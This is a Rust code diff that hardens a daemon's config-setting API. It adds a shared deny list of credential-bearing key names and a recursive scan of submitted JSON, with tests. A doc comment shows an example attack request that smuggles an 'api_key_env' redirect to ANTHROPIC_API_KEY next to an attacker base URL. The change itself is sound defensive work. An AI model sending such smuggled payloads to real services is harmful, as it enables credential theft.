@@ -855,38 +855,104 @@ fn is_writable_config_path(path: &str) -> bool {
 
     // Within an allowed section, refuse keys that obviously carry secrets or
     // override security-critical knobs even if the operator points us at one
-    // of the curated sections by name.
-    const SCRUB_SUFFIXES: &[&str] = &[
-        ".api_key",
-        ".token",
-        ".secret",
-        ".shared_secret",
-        ".password",
-        ".bypass",
-        ".admin",
-        ".owner",
-        // Round-4 review of #4678: env-var-name redirects. Codebase
-        // pervasively uses `*_token_env`, `*_password_env`,
-        // `*_secret_env`, `*_client_secret_env`, `*_api_key_env`,
-        // `bot_token_env`, `access_token_env`, `cdp_auth_token_env`.
-        // The original SCRUB only blocked literal `.api_key` etc., so
-        // an attacker could repoint `<section>.api_key_env` at any env
-        // var the daemon has access to and force a credential rotation
-        // through a logged channel. The blanket `_env` suffix catches
-        // every variant the workspace currently uses (verified by grep
-        // against librefang-types/src/config/types.rs).
-        "_env",
+    // of the curated sections by name. The check is on the path's final
+    // segment, which is what the caller is actually assigning.
+    if path.rsplit('.').next().is_some_and(is_scrubbed_config_key) {
+        return false;
+    }
+    true
+}
+
+/// True when `key` is the name of a config field that `POST /api/config/set`
+/// must never assign, because it carries a credential, redirects the env var a
+/// credential is resolved from, or grants privilege.
+///
+/// This is the single source of truth for both halves of the scrub: the path
+/// check in [`is_writable_config_path`] applies it to a path's final segment,
+/// and [`scrubbed_key_in_payload`] applies it to every key inside a submitted
+/// JSON payload. Keeping one predicate is the point — a new entry here closes
+/// the leaf path and the wholesale-table payload at the same time, instead of
+/// closing one and leaving the other open (#8085).
+pub(crate) fn is_scrubbed_config_key(key: &str) -> bool {
+    // Exact field names. Matched exactly rather than by suffix so that
+    // `shared_secret` is caught by its own entry and a field like `bot_token`
+    // is not caught by `token` — which is the behaviour the path check has had
+    // since round-4 of #4678, preserved here deliberately.
+    const SCRUB_KEYS: &[&str] = &[
+        "api_key",
+        "token",
+        "secret",
+        "shared_secret",
+        "password",
+        "bypass",
+        "admin",
+        "owner",
         // OAuth public identity that's safe to *display* but not safe
         // to mutate (issuer redirect / consent skipping). External
         // auth sections are mostly off the prefix list now, but defense
         // in depth in case anything slips through a writable section.
-        ".client_id",
-        ".client_secret",
+        "client_id",
+        "client_secret",
     ];
-    if SCRUB_SUFFIXES.iter().any(|s| path.ends_with(s)) {
-        return false;
+    // Round-4 review of #4678: env-var-name redirects. Codebase
+    // pervasively uses `*_token_env`, `*_password_env`,
+    // `*_secret_env`, `*_client_secret_env`, `*_api_key_env`,
+    // `bot_token_env`, `access_token_env`, `cdp_auth_token_env`.
+    // The original SCRUB only blocked literal `api_key` etc., so
+    // an attacker could repoint `<section>.api_key_env` at any env
+    // var the daemon has access to and force a credential rotation
+    // through a logged channel. The blanket `_env` suffix catches
+    // every variant the workspace currently uses (verified by grep
+    // against librefang-types/src/config/types.rs).
+    const SCRUB_KEY_SUFFIXES: &[&str] = &["_env"];
+
+    SCRUB_KEYS.contains(&key) || SCRUB_KEY_SUFFIXES.iter().any(|s| key.ends_with(s))
+}
+
+/// Return the first credential-shaped key found anywhere inside `value`, at any
+/// depth, or `None` when the payload carries none.
+///
+/// The path check alone is not enough. A writable section prefix accepts a
+/// write one level below the section (`segments == 1 || segments == 2` in
+/// [`is_writable_config_path`]), and at that depth the handler assigns the
+/// submitted JSON *wholesale* — `doc[section][key] = <value>`. So a caller can
+/// post an entire table at a path whose own name is innocuous and smuggle a
+/// scrubbed field in as one of its members:
+///
+/// ```text
+/// POST /api/config/set
+/// {"path": "media.custom_stt",
+///  "value": {"api_key_env": "ANTHROPIC_API_KEY", "base_url": "http://attacker/"}}
+/// ```
+///
+/// `media.custom_stt` ends in neither a scrubbed name nor `_env`, so the path
+/// check passes and the `api_key_env` redirect lands. That is the same defect
+/// class round-4 of #4678 removed `sidecar_channels` / `fallback_providers` /
+/// `taint_rules` from the allowlist for, and that
+/// `WRITABLE_DEPTH_2_ONLY_PREFIXES` forces per-leaf writes for under
+/// `channels.` — both of which are enumerations of known-bad prefixes rather
+/// than a rule, so every newly struct-typed config field reopened the hole.
+/// Scanning the payload closes it once for every section (#8085).
+///
+/// Legitimate per-field edits are unaffected: the same field is still writable
+/// one level deeper (`media.custom_stt.base_url`), where the path check governs
+/// it as it always has.
+pub(crate) fn scrubbed_key_in_payload(value: &serde_json::Value) -> Option<String> {
+    match value {
+        serde_json::Value::Object(map) => {
+            for (key, inner) in map {
+                if is_scrubbed_config_key(key) {
+                    return Some(key.clone());
+                }
+                if let Some(found) = scrubbed_key_in_payload(inner) {
+                    return Some(found);
+                }
+            }
+            None
+        }
+        serde_json::Value::Array(items) => items.iter().find_map(scrubbed_key_in_payload),
+        _ => None,
     }
-    true
 }
 
 /// Convert a serde_json::Value to a toml_edit::Value (format-preserving).
@@ -1693,5 +1759,99 @@ mod migrate_roots_tests {
             false,
         )
         .is_err());
+    }
+}
+
+#[cfg(test)]
+mod scrub_payload_tests {
+    use super::{is_scrubbed_config_key, is_writable_config_path, scrubbed_key_in_payload};
+
+    /// The refactor that introduced `is_scrubbed_config_key` must not have moved
+    /// the path check's boundary. Each case below is the behaviour the dotted
+    /// `SCRUB_SUFFIXES` list had: the final segment is matched exactly, so
+    /// `shared_secret` is caught by its own entry while `bot_token` — which no
+    /// entry names — is not.
+    #[test]
+    fn path_scrub_boundary_is_unchanged_by_the_shared_predicate() {
+        for closed in [
+            "media.api_key",
+            "media.custom_stt.api_key_env",
+            "web.brave.token",
+            "llm.shared_secret",
+            "queue.admin",
+            "skills.client_secret",
+        ] {
+            assert!(
+                !is_writable_config_path(closed),
+                "`{closed}` must stay closed"
+            );
+        }
+        for open in [
+            "media.custom_stt.base_url",
+            "web.search_provider",
+            "queue.concurrency.trigger_lane",
+        ] {
+            assert!(is_writable_config_path(open), "`{open}` must stay writable");
+        }
+        // Not named by any entry, and not caught by a suffix — unchanged from
+        // the pre-#8085 behaviour, and called out in the PR rather than widened
+        // here, because widening would change which paths are writable.
+        assert!(is_scrubbed_config_key("api_key_env"));
+        assert!(!is_scrubbed_config_key("bot_token"));
+    }
+
+    /// The scan has to find a scrubbed key wherever it sits, because the handler
+    /// assigns the whole submitted value at the path.
+    #[test]
+    fn payload_scan_finds_a_credential_key_at_every_depth() {
+        let cases = [
+            serde_json::json!({"api_key_env": "X"}),
+            serde_json::json!({"outer": {"api_key_env": "X"}}),
+            serde_json::json!({"outer": {"inner": {"token": "X"}}}),
+            serde_json::json!([{"client_secret": "X"}]),
+            serde_json::json!({"list": [{"password": "X"}]}),
+            serde_json::json!({"a": 1, "shared_secret": "X"}),
+        ];
+        for case in cases {
+            assert!(
+                scrubbed_key_in_payload(&case).is_some(),
+                "must be caught: {case}"
+            );
+        }
+    }
+
+    /// A payload with nothing credential-shaped must pass, or the scan would be
+    /// a blanket ban on object-valued writes and would break the primitive
+    /// collection sections (`provider_urls`, `tool_timeouts`, …) that round-4
+    /// of #4678 deliberately opened.
+    #[test]
+    fn payload_scan_passes_a_clean_payload() {
+        let cases = [
+            serde_json::json!({"base_url": "http://localhost/", "model": "m"}),
+            serde_json::json!({"openai": "http://localhost:9001/v1"}),
+            serde_json::json!({"nested": {"voice": "alloy", "format": "mp3"}}),
+            serde_json::json!("a plain string"),
+            serde_json::json!(7),
+            serde_json::json!(null),
+            serde_json::json!([1, 2, 3]),
+        ];
+        for case in cases {
+            assert_eq!(
+                scrubbed_key_in_payload(&case),
+                None,
+                "must pass cleanly: {case}"
+            );
+        }
+    }
+
+    /// The reported key is the one the operator has to go and edit, so it must
+    /// be the offending name rather than the first key seen.
+    #[test]
+    fn payload_scan_reports_the_offending_key_name() {
+        let value = serde_json::json!({"base_url": "http://a/", "api_key_env": "X"});
+        assert_eq!(
+            scrubbed_key_in_payload(&value).as_deref(),
+            Some("api_key_env")
+        );
     }
 }
